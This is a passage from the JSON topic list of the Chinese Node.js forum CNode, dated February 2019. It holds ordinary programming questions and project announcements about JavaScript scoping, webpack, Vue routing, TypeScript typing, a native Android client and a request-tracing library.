`${obj}`","last_reply_at":"2019-02-15T15:30:42.654Z","good":false,"top":false,"reply_count":0,"visit_count":543,"create_at":"2019-02-15T15:30:42.654Z","author":{"loginname":"xinshangshangxin","avatar_url":"https://avatars1.githubusercontent.com/u/8779091?v=4&s=120"}},{"id":"5c61274005cc322e7b137d2d","author_id":"5ab852d6320bb09d69e231f1","tab":"ask","content":"<div class=\"markdown-text\"><p>输入汉字拼音首字母,模糊查询数据,目前只有数据中预存拼音这一种方法么?比如数据库表中有name   pinyin2个字段\n\t里面存储数据 name:张三 pinyin:zhangsan,name:赵四 pinyin:zhaosi,查询输入zs,后台查询数据库pinyin这个字段,结果集为张三和赵四,就和高铁app上面查询车站那个搜索需求是一样的,主要前期设计数据库的时候没有设计pinyin这个字段,现在客户需求这个功能…有没有更好的办法解决呢?</p>\n</div>","title":"请教:输入汉字拼音首字母,模糊查询数据","last_reply_at":"2019-02-15T13:28:08.908Z","good":false,"top":false,"reply_count":13,"visit_count":952,"create_at":"2019-02-11T07:41:52.403Z","author":{"loginname":"iori2882","avatar_url":"https://avatars3.githubusercontent.com/u/1480587?v=4&s=120"}},{"id":"5c66a4ce0752e020af943fae","author_id":"5a308444d92f2f5b185acdef","tab":"ask","content":"<div class=\"markdown-text\"><p>有没有Node.js后端面试题啊？</p>\n<p>From <a href=\"https://github.com/soliury/noder-react-native\">Noder</a></p>\n</div>","title":"Node.js后端开发面试","last_reply_at":"2019-02-15T11:38:54.736Z","good":false,"top":false,"reply_count":0,"visit_count":1087,"create_at":"2019-02-15T11:38:54.736Z","author":{"loginname":"wangjunwangjunwang","avatar_url":"https://avatars0.githubusercontent.com/u/13000047?v=4&s=120"}},{"id":"5c63f0c70752e020af943395","author_id":"56ce68bc842c03521a73520e","tab":"ask","content":"<div class=\"markdown-text\"><p>如题，代码执行后报错：a is not defined\n顺带研究下var和let的区别：var a=1;function foo (){console.log(‘a:’,a);var a = 2;};foo();为什么是打印a:undefined</p>\n</div>","title":"let a=1;function foo (){console.log('a:',a);let a = 2;};foo();为什么报错？","last_reply_at":"2019-02-15T10:09:24.161Z","good":false,"top":false,"reply_count":17,"visit_count":1020,"create_at":"2019-02-13T10:26:15.926Z","author":{"loginname":"JarvisQJ","avatar_url":"https://avatars1.githubusercontent.com/u/15104950?v=4&s=120"}},{"id":"552dbeede10460475e7f7554","author_id":"552d18e21c85ba08189151b5","tab":"share","content":"<div class=\"markdown-text\"><p>去年底的时候开始学习nodejs，<a href=\"http://xn--cnodejs-f43k0zt42bnp9azcmqx7b.org\">无意中发现了cnodejs.org</a>，并从大家的讨论中获益颇多，但是水平有限，一直在潜水。最近注意到社区里的移动客户端是采用hybrid方式开发的，在android系统的体验上有点差强人意，于是本着回(fang)报(bian)社(zi)区(ji)的宗旨，抽一周多时间写了个原生客户端，希望能提高非水果机的移动体验，欢迎各位拍砖^_^</p>\n<p>ps：App的logo图标直接取自官方app，还请见谅：）</p>\n<p><strong>2015-4-18更新说明（v1.0.1）</strong></p>\n<ul>\n<li>增加简单的栏目缓存</li>\n<li>回复列表采用WebView显示，保证页面内容的渲染效果</li>\n<li>修复部分机型可能异常退出的bug</li>\n</ul>\n<p><strong>功能简介（v1.0.0）</strong></p>\n<ul>\n<li>各栏目列表页展示，下拉刷新，上拉加载更多（数据按栏目懒加载，默认15条/页，切换栏目时默认5分钟自动刷新，从栏目页左边缘拖拽可打开左侧菜单）</li>\n<li>内容页展示（向右滑动可快速返回）</li>\n<li>扫码登录</li>\n<li>回复主题，包括@特定用户（点击特定条目可@相应的用户）</li>\n<li>发表新话题</li>\n</ul>\n<p><strong>App截图</strong>\n<img src=\"//static.cnodejs.org/FtGrSIq9SOBPiIGKXd1h25TFvn8R\" alt=\"01.png\">&lt;br&gt;\n<img src=\"//static.cnodejs.org/FjQKUSCIiAdCGg4316QUyarQs76z\" alt=\"02.png\">&lt;br&gt;\n<img src=\"//static.cnodejs.org/Fhtwy44aJPVgSGstZUjN7g5zLXb5\" alt=\"03.png\">&lt;br&gt;\n<img src=\"//static.cnodejs.org/FrdEbGE7S0fXDFHff1wA43ZRJGvV\" alt=\"04.png\">&lt;br&gt;</p>\n<p><strong>下载地址</strong></p>\n<ol>\n<li>Github    <a href=\"https://github.com/iwhys/CNode-android/releases\">https://github.com/iwhys/CNode-android/releases</a>&lt;br&gt;\n<img src=\"//static.cnodejs.org/Fh0Oc90I8rHsbziOTFuPqBTE5K2T\" alt=\"qr.png\">&lt;br&gt;</li>\n<li>FIR    <a href=\"http://fir.im/7cfy\">http://fir.im/7cfy</a>&lt;br&gt;\n<img src=\"//static.cnodejs.org/FhmbVnOLywiD2eO_jVwtOv6du8J_\" alt=\"ddd.png\">&lt;br&gt;</li>\n</ol>\n<p><strong>BUG反馈</strong>\n请直接回复本帖，或到https://github.com/iwhys/CNode-android/issues发起issue</p>\n<p><strong>项目源码</strong>\n<a href=\"https://github.com/iwhys/CNode-android\">https://github.com/iwhys/CNode-android</a></p>\n</div>","title":"CNodejs社区原生安卓客户端【2015-4-18更新】","last_reply_at":"2019-02-15T09:19:38.083Z","good":false,"top":false,"reply_count":53,"visit_count":13567,"create_at":"2015-04-15T01:29:17.544Z","author":{"loginname":"iwhys","avatar_url":"https://avatars2.githubusercontent.com/u/11944182?v=4&s=120"}},{"id":"5c6668240752e020af943d88","author_id":"576a5d4063075514079b77e7","tab":"share","content":"<div class=\"markdown-text\"><p>跨域资源共享，了解一下</p>\n<p><a href=\"https://www.liayal.com/article/5c623937c0ab13505eeefaab\">每一个WEB开发都需要知道的CORS</a></p>\n</div>","title":"每一个WEB开发都需要知道的CORS","last_reply_at":"2019-02-15T07:20:04.658Z","good":false,"top":false,"reply_count":0,"visit_count":944,"create_at":"2019-02-15T07:20:04.658Z","author":{"loginname":"MaelWeb","avatar_url":"https://avatars1.githubusercontent.com/u/7869311?v=4&s=120"}},{"id":"5c440ba76955112b99436f07","author_id":"5ab852d6320bb09d69e231f1","tab":"ask","content":"<div class=\"markdown-text\"><p>在网络上大概搜索一下,好像是不能?虽然说Java编译的代码也能反编译(一般人还是反编译不了的)…但是直接把代码裸着部署在客户的服务器上不好吧?随随便便拷贝一下懂一些JS就能直接修改代码了…最重要的是,node.js做出来的产品在客户的服务器上部署并想按年授权收费是不是就没有办法了?还得用Java等语言重做?\n代码混淆jshaman挺好的,但是他们的代码混淆竟然不支持ES6语法~~~~~~~~~~~\n大家都是怎么弄得啊?还是大家都没有把服务端部署在客户本地服务器上的需求?</p>\n</div>","title":"node.js能像Java一样编译代码么?","last_reply_at":"2019-02-15T06:40:26.300Z","good":false,"top":false,"reply_count":18,"visit_count":2073,"create_at":"2019-01-20T05:48:23.439Z","author":{"loginname":"iori2882","avatar_url":"https://avatars3.githubusercontent.com/u/1480587?v=4&s=120"}},{"id":"5c654ca10752e020af9439eb","author_id":"5c3be43ca4d44449266b063e","tab":"ask","content":"<div class=\"markdown-text\"><p><code>js \\n const child_process = require('child_process'); \\n const child = child_process.spawn('ls',[],{ stdio: 'inherit' });</code>\n请教一下，stdio配置项的作用是什么？官方文档看了半天也没明白</p>\n</div>","title":"关于child_process 中的stdio配置项的问题","last_reply_at":"2019-02-15T01:12:16.837Z","good":false,"top":false,"reply_count":1,"visit_count":515,"create_at":"2019-02-14T11:10:25.541Z","author":{"loginname":"superTerrorist","avatar_url":"https://avatars1.githubusercontent.com/u/7795335?v=4&s=120"}},{"id":"5c4d498a595cbd1e95088cd0","author_id":"5c2f299a5bf06c5e7e3f15d5","tab":"share","content":"<div class=\"markdown-text\"><h2>本文覆盖常见的Webpack4配置大全， 文章很长分三部分。</h2>\n<ul>\n<li>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//juejin.im/post/5c4bfd89e51d45215c2e5a76\">Part-1</a></p>\n</li>\n<li>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//juejin.im/post/5c4c52bd6fb9a049c0436717\">Part-2</a></p>\n</li>\n<li>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//juejin.im/post/5c4c6a02f265da6158777e57\">Part-3</a></p>\n</li>\n</ul>\n<h2>源码仓库地址</h2>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//github.com/NuoHui/webpack-demo\">webpack-demo</a></p>\n</div>","title":"一个Webpack4配置工程师的素养","last_reply_at":"2019-02-14T07:36:23.028Z","good":false,"top":false,"reply_count":8,"visit_count":1349,"create_at":"2019-01-27T06:02:50.145Z","author":{"loginname":"NuoHui","avatar_url":"https://avatars2.githubusercontent.com/u/42414989?v=4&s=120"}},{"id":"5c4e9d1fa4647e02328f1a0c","author_id":"5c2e23963898674067a7ae2b","tab":"ask","content":"<div class=\"markdown-text\"><p>需求大体就是发布一个二进制的 http 服务给用户使用，一共大约 4-5 个接口。\n调研了一下，有下面几种选择。\n1 electorn + express\n2 nodejs + express\n3 java + jre\n4 golang\n5 c++</p>\n<p>java 和 nodejs 跨平台很方便，但是都需要用户手动安装依赖。\nelectorn 的话安装包太大了。\n那么 golang 是不是最好的选择了。编译成二进制，什么平台都支持。</p>\n</div>","title":"如果要发布一个 http 服务，有比 golang 更好的选择吗？","last_reply_at":"2019-02-14T04:53:08.229Z","good":false,"top":false,"reply_count":8,"visit_count":1530,"create_at":"2019-01-28T06:11:43.255Z","author":{"loginname":"DiamondYuan","avatar_url":"https://avatars1.githubusercontent.com/u/9692408?v=4&s=120"}},{"id":"5c64c9ce0752e020af9435fd","author_id":"5c1c411f76c4964062a1c0e3","tab":"share","content":"<div class=\"markdown-text\"><p>前站导航发布了新的模块：代码秀\n主要目的是以动态的方式记录代码，把一些优秀的代码分享给他人。\n<strong><a href=\"https://www.frontendjs.com/codetime\">网址链接</a></strong></p>\n<p><img src=\"//static.cnodejs.org/FtQykyq_KPfDLFzv51E5hGzx_401\" alt=\"20190214094928_54354.png\"></p>\n</div>","title":"代码秀功能发布","last_reply_at":"2019-02-14T04:24:55.834Z","good":false,"top":false,"reply_count":4,"visit_count":917,"create_at":"2019-02-14T01:52:14.654Z","author":{"loginname":"bestvist","avatar_url":"https://avatars2.githubusercontent.com/u/22828569?v=4&s=120"}},{"id":"5c62aef20752e020af942e41","author_id":"5ba0f14737a6965f59051ab5","tab":"share","content":"<div class=\"markdown-text\"><p><a href=\"https://docsmall.com\">docsmall在线图片压缩工具</a></p>\n<p>有需要的朋友可以用用看</p>\n<p><img src=\"//static.cnodejs.org/FrbnjzNz3fFX1IvNNSZdiDYH4QBD\" alt=\"20190212193207.gif\"></p>\n</div>","title":"我们开发了一个在线图片压缩、PDF 压缩、合并、分割的小工具","last_reply_at":"2019-02-14T02:08:02.425Z","good":false,"top":false,"reply_count":10,"visit_count":1166,"create_at":"2019-02-12T11:33:06.418Z","author":{"loginname":"houxiaohou","avatar_url":"https://avatars0.githubusercontent.com/u/1525931?v=4&s=120"}},{"id":"5c62262f05cc322e7b137ec9","author_id":"59e6c301bcfcc03162f2ffc3","tab":"share","content":"<div class=\"markdown-text\"><pre class=\"prettyprint\"><code>var o={} \ni=0\no.valueOf=function(){\n return i++\n}\no==0\n&#x2F;&#x2F;true\no==0\n&#x2F;&#x2F;false\n</code></pre><p>今天真的就遇到该系列了… 由于get set 导致两次取值不一致的情况…</p>\n</div>","title":"哇你居然在代码里面下毒系列--1","last_reply_at":"2019-02-13T11:02:45.964Z","good":false,"top":false,"reply_count":5,"visit_count":1203,"create_at":"2019-02-12T01:49:35.274Z","author":{"loginname":"spitWind","avatar_url":"https://avatars2.githubusercontent.com/u/18753430?v=4&s=120"}},{"id":"5c63f8cd0752e020af9433d4","author_id":"59e6c301bcfcc03162f2ffc3","tab":"share","content":"<div class=\"markdown-text\"><p>Efilemangage</p>\n<p>git: <a href=\"https://github.com/spitWind/EFileMangage\">https://github.com/spitWind/EFileMangage</a></p>\n<p>##启动</p>\n<pre class=\"prettyprint language-bash\"><code>npm instal l\nelectron .\n</code></pre><p>##功能\n1.初始一个文件收藏夹 以及备注功能\n欢迎fork\n##授权\n禁止任意形式所有商业行为,以及传递后的商业行为</p>\n</div>","title":"Efilemangage 欢迎加入~","last_reply_at":"2019-02-13T11:00:29.773Z","good":false,"top":false,"reply_count":0,"visit_count":551,"create_at":"2019-02-13T11:00:29.773Z","author":{"loginname":"spitWind","avatar_url":"https://avatars2.githubusercontent.com/u/18753430?v=4&s=120"}},{"id":"5c50213fa4647e02328f21f8","author_id":"57bbcb58b32043f532d40e6f","tab":"ask","content":"<div class=\"markdown-text\"><p>最近想学个 node 框架（支持 ts），发现这仨框架应该算是比较流行的了（express 略古老，koajs 还要自己拼装插件）。</p>\n<p>不知道这三个框架哪一个比较合适？</p>\n<p>打算的架构是 nodejs + redis + mongodb/mysql。</p>\n</div>","title":"Egg.js/thinkjs/nestjs 该如何选择？","last_reply_at":"2019-02-13T08:30:02.922Z","good":false,"top":false,"reply_count":32,"visit_count":2317,"create_at":"2019-01-29T09:47:43.325Z","author":{"loginname":"JZLeung","avatar_url":"https://avatars2.githubusercontent.com/u/7995232?v=4&s=120"}},{"id":"5c59166605cc322e7b13751b","author_id":"5276bef8d2b3893f2a1943fb","tab":"share","content":"<div class=\"markdown-text\"><p><a href=\"https://gridsome.org\">https://gridsome.org</a>\n各位有人用过这个吗？今天看到个 Gridsome 用起来十分舒服，基本上等同于 Vue 里的 Gatsby，因为 Vue 的单文件组件机制，看起来比 JS、HTML、React 混成一坨的 React 代码更优雅点，用法跟 Nuxt 其实很像，也提供了 Nuxt 里没有的东西，静态化应该做的比 Nuxt 更好，已经极致优化过速度，自动代码分包和其他一系列懒加载、生成静态配套，连图片的懒加载都做了。</p>\n<p>而且还集成了 GraphQL，在单文件组件里就可以直接用 &lt;page-query&gt; 的这个类似 &lt;script&gt; 的标签来直接调用 GraphQL，觉得比那种写在代码里的优雅也省事多了，对性能、SEO和开发效率都有优化，不过看国内好像还没什么人用啊？</p>\n</div>","title":"Gridsome - Vue.js 生态圈下的 Gatsby.js","last_reply_at":"2019-02-13T04:12:16.816Z","good":false,"top":false,"reply_count":5,"visit_count":1086,"create_at":"2019-02-05T04:51:50.988Z","author":{"loginname":"andyhu","avatar_url":"https://avatars3.githubusercontent.com/u/203980?v=4&s=120"}},{"id":"57356c5e8f82e08e531de6ca","author_id":"532dbbb095db4c2478006daa","tab":"share","content":"<div class=\"markdown-text\"><p>dotENV已经有很多模块，用得比较做的 dotenv，\n但是都是只支持一维的，我试着弄了个多维的，也就几十行代码：</p>\n<blockquote>\n<p>先放地址 <a href=\"https://github.com/captainblue2013/dotenvR\">https://github.com/captainblue2013/dotenvR</a></p>\n</blockquote>\n<hr>\n<h2>Install</h2>\n<pre class=\"prettyprint\"><code>npm install dotenvr --save\n</code></pre><h2>Usage</h2>\n<pre class=\"prettyprint\"><code>var config = require(&#x27;dotenvr&#x27;).load(); &#x2F;&#x2F;默认当前路径 .env \n&#x2F;&#x2F;var config = require(&#x27;dotenvr&#x27;).load(&#x27;&#x2F;path&#x2F;of&#x2F;your&#x2F;.env&#x27;);\n</code></pre><h2>Example</h2>\n<p>.env</p>\n<pre class=\"prettyprint\"><code> APP = demo\n A.B.C = 123\n</code></pre><p>var config = require(‘dotenvr’).load(); // also see process.env</p>\n<pre class=\"prettyprint\"><code> {\n     APP:&#x27;demo&#x27;,\n     A:{\n         B:{\n             C:123\n         }\n     }\n }</code></pre></div>","title":"最近在用 dotENV ，于是做了一个支持多层的轮子","last_reply_at":"2019-02-13T02:28:54.986Z","good":false,"top":false,"reply_count":4,"visit_count":3662,"create_at":"2016-05-13T05:55:42.479Z","author":{"loginname":"captainblue2013","avatar_url":"https://avatars1.githubusercontent.com/u/3942299?v=4&s=120"}},{"id":"5c53f19f05cc322e7b136e1c","author_id":"56ce68bc842c03521a73520e","tab":"ask","content":"<div class=\"markdown-text\"><p>在看《JavaScript高级程序设计》，章节6.2.2中最后（147页）提供了一种构造函数定义方式，但作者自己又说有问题，但并未讲清楚问题是什么，所以请大家讲讲？</p>\n<pre class=\"prettyprint\"><code>function Person(name, age, job){\n this.name = name;\n this.age = age;\n this.job = job;\n this.sayName = sayName;\n}\nfunction sayName(){\n alert(this.name);\n}\nvar person1 = new Person(&quot;Nicholas&quot;, 29, &quot;Software Engineer&quot;);\nvar person2 = new Person(&quot;Greg&quot;, 27, &quot;Doctor&quot;);\nperson1.sayName===person2.sayName; &#x2F;&#x2F; true\n</code></pre><p>这段代码的原文评注如下：\n在这个例子中，我们把sayName()函数的定义转移到了构造函数外部。而在构造函数内部，我们\n将sayName 属性设置成等于全局的sayName 函数。这样一来，由于sayName 包含的是一个指向函数\n的指针，因此person1 和person2 对象就共享了在全局作用域中定义的同一个sayName()函数。这\n样做确实解决了两个函数做同一件事的问题，可是新问题又来了：<strong>在全局作用域中定义的函数实际上只\n能被某个对象调用，这让全局作用域有点名不副实。而更让人无法接受的是：如果对象需要定义很多方\n法，那么就要定义很多个全局函数，于是我们这个自定义的引用类型就丝毫没有封装性可言了。</strong></p>\n<p>有木有觉得粗体这段不知所云？</p>\n</div>","title":"《JavaScript高级程序设计》中的一个疑点","last_reply_at":"2019-02-13T01:48:09.794Z","good":false,"top":false,"reply_count":6,"visit_count":1348,"create_at":"2019-02-01T07:13:35.491Z","author":{"loginname":"JarvisQJ","avatar_url":"https://avatars1.githubusercontent.com/u/15104950?v=4&s=120"}},{"id":"5c580a4105cc322e7b137466","author_id":"5a751a679288dc81532884bf","tab":"ask","content":"<div class=\"markdown-text\"><p>我现在有一套多项目多页面的前端代码，所有的项目都共用基础库（vue、echarts等）、公共js（自己写的公共方法以及配置）。大致结构如下\n<img src=\"//static.cnodejs.org/Fn2a95Q-cNNM5mm86EXMrUf0oasG\" alt=\"image.png\"></p>\n<p>说明：demo和test分别是两个独立的多页面项目，但是共用基础库（lib）和公共js（util）。基础库是长久不变的，可以由所有项目公用，但是公共js是可能变化的，所以我希望在打包的时候，公共js能打包到每个项目里面，这个项目的多个页面使用这一个公共js。 另外一个项目的多个页面，使用另外的公共js。</p>\n<p>如下图，希望的结果是util.js在demo/js和test/js下各有一分，demo和test分别引用各自js/下的的uitl。\n<img src=\"//static.cnodejs.org/Fj4rTRhh-879q4ltMlkqMrOGR8FI\" alt=\"image.png\"></p>\n<p>这样我就可以在修改公共代码后，只上传dist/demo，来达到只更新demo项目下的公共js的目的。\nutil配置代码是这样的：请问大佬，这个util怎么才能配置成活的呢\n<img src=\"//static.cnodejs.org/FsJzOidkWfIRmLbpcAvTeYHJgmzu\" alt=\"image.png\"></p>\n</div>","title":"webpack4多页面多项目工程的公共js提取问题","last_reply_at":"2019-02-12T08:52:09.271Z","good":false,"top":false,"reply_count":3,"visit_count":1115,"create_at":"2019-02-04T09:47:45.250Z","author":{"loginname":"hejiaoshou","avatar_url":"https://avatars0.githubusercontent.com/u/24504661?v=4&s=120"}},{"id":"5c6287ad05cc322e7b13816f","author_id":"5af3dec21b02288048bd0eb1","tab":"ask","content":"<div class=\"markdown-text\"><p>node的第三方模块中支持mysql schema的模块吗？像使用mongoose中的schema一样。</p>\n</div>","title":"node的第三方模块中支持mysql schema的模块吗？","last_reply_at":"2019-02-12T08:45:33.665Z","good":false,"top":false,"reply_count":0,"visit_count":543,"create_at":"2019-02-12T08:45:33.665Z","author":{"loginname":"witlxx","avatar_url":"https://avatars0.githubusercontent.com/u/25942898?v=4&s=120"}},{"id":"5c6265b405cc322e7b138022","author_id":"511350f6df9e9fcc58856443","tab":"share","content":"<div class=\"markdown-text\"><h1>前言</h1>\n<p>转眼新年过了，开始了搬砖的日子。在这里给大家拜个晚年，送上一些小知识，希望大家好搬砖！</p>\n<h1>klg-tracer</h1>\n<p>链路追踪工具，base on <a href=\"https://github.com/midwayjs/pandora\">pandora</a></p>\n<h2>Installation</h2>\n<pre class=\"prettyprint language-bash\"><code>npm install klg-tracer\n</code></pre><p>Node.js &gt;= 8.2.1 required.</p>\n<h2>Features</h2>\n<p>Pandora 提供基于 OpenTracing 标准的链路追踪信息，在此基础上，klg-tracer 自定义了一些 tags，并支持将 tracer 信息写入 mongo。</p>\n<h2>QuickStart</h2>\n<h3>一、配合 Pandora 使用，自定义tags</h3>\n<p>TODO</p>\n<ol>\n<li>export 拓展好的类</li>\n<li>覆盖 Pandora 的默认配置</li>\n</ol>\n<h3>二、将 tracer 结果写入 Mongo</h3>\n<p>app.ts</p>\n<pre class=\"prettyprint language-js\"><code>import {TraceService, Tracer} from &#x27;klg-tracer&#x27;\n\nnew TraceService().registerHooks({\n    httpServer: {\n      useKoa:true, &#x2F;&#x2F; 在 koa 设置钩子，比直接在 http 层设置钩子稳定\n      &#x2F;&#x2F; 过滤器，只记录特定接口, 注意 return true 的才会被过滤\n      requestFilter: function (req) {\n        const urlParsed = url.parse(req.url, true);\n        return urlParsed.pathname.indexOf(&#x27;product&#x2F;&#x27;) === -1;\n      }\n    }\n  }).registerMongoReporter({\n    mongoUrl: config.database.mongodb[0].url,\n    collectionName: &#x27;tracer&#x27;\n  });\n\n</code></pre><p>完整的配置可以见 src/domain</p>\n<pre class=\"prettyprint language-typescript\"><code>interface TracerOptions {\n  httpServer?: {\n    recordGetParams?: boolean,    &#x2F;&#x2F; 是否记录 query\n    recordPostData?: boolean,     &#x2F;&#x2F; 是否记录 post data\n    recordResponse?: boolean,     &#x2F;&#x2F; 是否记录 response\n    requestFilter?: requestFilter,  &#x2F;&#x2F; 过滤器\n    interceptor?: interceptor       &#x2F;&#x2F; 中间件 TODO\n  },\n  httpClient?: {\n    enabled: boolean, options?: {\n      recordGetParams?: boolean,\n      recordPostData?: boolean,\n      recordResponse?: boolean\n    }\n  },\n  mongodb?: { enabled: boolean, options?: any }\n}\n</code></pre><p>启动你的 Web 服务并访问，相关的请求信息将会写入 tracer 表中。</p>\n<p>Search:</p>\n<pre class=\"prettyprint language-js\"><code>﻿db.tracer.find({name : &#x27;http-server&#x27;}).sort({_id : -1})\n</code></pre><p>Result:</p>\n<pre class=\"prettyprint language-js\"><code>{\n    &quot;_id&quot; : ObjectId(&quot;5ad99bd3f29cf14de64516b3&quot;),\n    &quot;tags&quot; : {\n        &quot;httpMethod&quot; : &quot;POST&quot;,\n        &quot;url&quot; : &quot;&#x2F;api&#x2F;v1&#x2F;account&#x2F;register&quot;,\n        &quot;data&quot; : {\n            &quot;userId&quot; : &quot;5527da927855af35354c39eb&quot;,\n            &quot;userRole&quot; : &quot;INVESTOR&quot;\n        },\n        &quot;response&quot; : {\n            &quot;code&quot; : 0,\n            &quot;message&quot; : &quot;success&quot;,\n            &quot;data&quot; : {\n                &quot;html&quot; : &quot;html&quot;\n            }\n        }\n    },\n    &quot;traceId&quot; : &quot;6e11fe95c2035a7a&quot;,\n    &quot;name&quot; : &quot;http-server&quot;,\n    &quot;timestamp&quot; : 1524210643694.0,\n    &quot;duration&quot; : 152,\n    &quot;createdAt&quot; : ISODate(&quot;2018-04-20T07:50:43.874Z&quot;),\n    &quot;updatedAt&quot; : ISODate(&quot;2018-04-20T07:50:43.874Z&quot;),\n    &quot;__v&quot; : 0\n}\n</code></pre><h3>Tracer tags</h3>\n<ol>\n<li>http server</li>\n</ol>\n<ul>\n<li>http.method</li>\n<li>http.path  // path</li>\n<li>http.query    // query string</li>\n<li>http.data  // post body, only json</li>\n<li>http.response</li>\n</ul>\n<ol>\n<li>http client</li>\n</ol>\n<ul>\n<li>http.method</li>\n<li>http.url  // path</li>\n<li>http.hostname  // send to where</li>\n<li>http.port</li>\n<li>http.query</li>\n<li>http.data</li>\n<li>http.response</li>\n<li>http.response_size</li>\n<li>http.status_code</li>\n<li>http.error_code</li>\n</ul>\n<ol>\n<li>mongo\ntodo</li>\n</ol>\n<h2>Test</h2>\n<pre class=\"prettyprint language-bash\"><code>$ npm i\n$ npm test\n</code></pre><h2>How it works</h2>\n<h3>tracer</h3>\n<p>implements session with <a href=\"https://nodejs.org/api/async_hooks.html\">async_hooks</a> and <a href=\"https://github.com/Jeff-Lewis/cls-hooked\">cls-hooked</a></p>\n<h3>hook</h3>\n<p>serve : hack http createServer method, register listener.</p>\n<p>http-client : hack http request method, register listener.</p>\n<h2>ChangeLog</h2>\n<p>3.0.0</p>\n<ul>\n<li>基于 Pandorajs 重做，目前只提供 http-server http-client mongo 三个位置的监听</li>\n</ul>\n<p>1.2.0</p>\n<ul>\n<li>koa-server hook add requestFilter options</li>\n</ul>\n<p>1.1.0</p>\n<ul>\n<li>koa-server hook add intercept options</li>\n</ul>\n<p>1.0.3</p>\n<ul>\n<li>http-client hook trace request parameters and response</li>\n</ul>\n<p>1.0.0</p>\n<ul>\n<li>add http-server koa-server hook</li>\n<li>add http-client hook</li>\n<li>add mongo report</li>\n</ul>\n<h2>常见问题</h2>\n<p>1 thenable 函数会 break cls 的上下文，像 mongoose 和 superagent 都是在 prototype 里添加 then function 来支持 Promise 的，所有都会有这个问题。\n目前只能通过改变写法来避免这个问题，例如：</p>\n<p>break session</p>\n<pre class=\"prettyprint language-js\"><code>await User.findOne({})\n</code></pre><p>work</p>\n<pre class=\"prettyprint language-js\"><code>await User.findOne({}).then()\n</code></pre><p>详情见此 issue <a href=\"https://github.com/midwayjs/pandora/issues/221\">https://github.com/midwayjs/pandora/issues/221</a></p>\n<p>2 mongodb nodejs driver 3.0 版本升级了 apm 的实现，Pandorajs 还未支持\n详情见此 issue <a href=\"https://github.com/midwayjs/pandora/issues/239\">https://github.com/midwayjs/pandora/issues/239</a></p>\n<hr>\n<p>著作权归本文作者所有，未经授权，请勿转载，谢谢。</p>\n</div>","title":"AI考拉技术分享-Node基础架构专题（三）","last_reply_at":"2019-02-12T06:20:36.609Z","good":false,"top":false,"reply_count":0,"visit_count":681,"create_at":"2019-02-12T06:20:36.609Z","author":{"loginname":"kalengo","avatar_url":"https://avatars2.githubusercontent.com/u/8817810?v=4&s=120"}},{"id":"5c614c7fe6aaad2ea76df78a","author_id":"5a77fac6afa0a121784a9300","tab":"ask","content":"<div class=\"markdown-text\"><pre class=\"prettyprint language-vue\"><code>&lt;template&gt;\n  &lt;div class=&quot;container&quot;&gt;\n    &lt;div class=&quot;content&quot;&gt;\n      &lt;router-view&gt;&lt;&#x2F;router-view&gt;\n    &lt;&#x2F;div&gt;\n  &lt;&#x2F;div&gt;\n&lt;&#x2F;template&gt;\n\n&lt;script&gt;\n  import VueRouter from &#x27;vue-router&#x27;;\n  import PostList from &#x27;.&#x2F;posts&#x27;;\n\n  export default {\n    props: [&#x27;outside&#x27;],\n    router: new VueRouter({\n      mode: &#x27;history&#x27;,\n      routes: [{\n        path: &#x27;&#x2F;&#x27;,\n        component: PostList,\n        name: &#x27;post_index&#x27;,\n        props: {outside: outside}\n      }]\n    })\n  };\n&lt;&#x2F;script&gt;\n</code></pre><p>本身是个组件，请问我要怎么在这里把<code>outside</code>的参数传给<code>PostList</code>这个组件</p>\n</div>","title":"问一个关于Vue路由初始化时传默认参数的问题","last_reply_at":"2019-02-11T15:39:38.255Z","good":false,"top":false,"reply_count":1,"visit_count":550,"create_at":"2019-02-11T10:20:47.891Z","author":{"loginname":"jiyarong","avatar_url":"https://avatars2.githubusercontent.com/u/8100962?v=4&s=120"}},{"id":"5b3ad07657137f22415c5262","author_id":"5ad06588a7d228c16b986a94","tab":"ask","content":"<div class=\"markdown-text\"><p>反面例子1：</p>\n<pre class=\"prettyprint\"><code>function abc(a: string, b: number): void;\nfunction abc(a: string): void;\nfunction abc(a: any, b:any): void {\n\tif (typeof b === &#x27;number&#x27;){}\n\telse {}\n}\nabc.someAttr = ()=&gt;{};\n</code></pre><p>反面例子2：</p>\n<pre class=\"prettyprint\"><code>interface IAbc {\n\t(a: string, b: number): void;\n\t(a: string): void;\n\tsomeAttr: ()=&gt;void;\n}\nlet abc: IAbc = (a: any, b:any) =&gt; {\n\tif (typeof b === &#x27;number&#x27;){}\n\telse {}\n}\nabc.someAttr = ()=&gt;{};\n</code></pre><p>现在这样凑合着：</p>\n<pre class=\"prettyprint\"><code>interface IAbc {\n\t(a: string, b: number): void;\n\t(a: string): void;\n\tsomeAttr?: ()=&gt;void; &#x2F;&#x2F; 加了个问号\n}\nlet abc: IAbc = (a: any, b?:any) =&gt; {\n\tif (typeof b === &#x27;number&#x27;){}\n\telse {}\n}\nabc.someAttr = ()=&gt;{};\n</code></pre><p>请问有人知道正确手法吗？</p>\n</div>","title":"TypeScript 中应如何声明一个函数，之后给它添加静态属性？","last_reply_at":"2019-02-11T15:35:20.549Z","good":false,"top":false,"reply_count":22,"visit_count":3599,"create_at":"2018-07-03T01:25:10.884Z","author":{"loginname":"xyzingh","avatar_url":"https://avatars0.githubusercontent.com/u/32507398?v=4&s=120"}},{"id":"5c53ee2305cc322e7b136ded","author_id":"5a7ec2c48d6e16e56bb806d7","tab":"ask","content":"<div class=\"markdown-text\"><p>不是读取网站目录拿到、我想要通过api接口获得，应该如何操作？\n默认创建账户method：personal_newAccount是拿不到这些的，不耻下问。</p>\n</div>","title":"请问以太坊创建账户如何拿到他的keystore和privatekey？","last_reply_at":"2019-02-11T11:12:29.375Z","good":false,"top":false,"reply_count":1,"visit_count":751,"create_at":"2019-02-01T06:58:43.877Z","author":{"loginname":"onesez","avatar_url":"https://avatars1.githubusercontent.com/u/16702534?v=4&s=120"}},{"id":"5c5a8f5105cc322e7b137632","author_id":"556150874eb040084cfe5dcb","tab":"share","content":"<div class=\"markdown-text\"><h2>在线试用</h2>\n<p><a href=\"https://music.xinshangshangxin.com\">https://music.xinshangshangxin.com</a></p>\n<h2>github</h2>\n<p><a href=\"https://github.com/xinshangshangxin/music\">https://github.com/xinshangshangxin/music</a></p>\n<h2>界面说明</h2>\n<p><img src=\"//static.cnodejs.org/FlVr2g5AQa9uvyvMl1lGpwKgSciJ\" alt=\"image.png\">\n<img 